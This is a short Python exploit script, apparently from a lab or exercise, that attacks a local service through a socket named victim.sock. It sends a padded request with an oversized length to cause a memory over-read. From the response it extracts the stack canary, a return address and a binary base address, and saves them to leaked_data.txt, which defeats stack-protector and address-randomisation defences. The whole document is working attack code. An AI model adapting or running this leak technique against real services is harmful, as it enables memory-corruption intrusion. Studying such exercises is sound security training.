import os
import socket
import sys

#create a socket to read from file handler
sock = os.getenv("HOME") + "/victim.sock"
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(sock)

#send string and length to server
strg = b'A' * 16 + b'\n280\n'
s.send(strg)
data = s.recv(1024)
s.close()

canary = []
ret_addr = []
bin_addr = []
#valuebyte = ''

for i in range(len(data)):
	this_byte = hex(ord(data[i]))
	if len(this_byte) == 3:
		this_byte = '0x0' + this_byte[2]
	#valuebyte += this_byte + '\t'
	if i>23 and i<32:
		canary.append(this_byte)
	if i>15 and i<24:
		ret_addr.append(this_byte)
	if i>271 and i<280:
		bin_addr.append(this_byte)
	#if (i+1)%8 == 0:
		#print(valuebyte)
		#valuebyte = ''

# get binary base address (entry location)
#os.system('readelf -a ../victim | grep -i "entry" > tmp')
#binadd = open('tmp', 'r').read()
#binadd = binadd.split(':')
#print(binadd[1].strip())

canary.reverse()
canary_str = ''
for c in range(8):
	canary_str += canary[c]

ret_addr.reverse()
ret_addr_str = ''
for r in range(8):
	ret_addr_str += ret_addr[r]

bin_addr.reverse()
bin_addr_str = ''
for b in range(8):
	bin_addr_str += bin_addr[b]

write_to_file = '0x' + canary_str.replace('0x','') + '\n0x' + ret_addr_str.replace('0x','') + '\n0x' + bin_addr_str.replace('0x','') + '\n'

filename = 'leaked_data.txt'
with open(filename, 'w') as file_object:
    file_object.write(write_to_file)
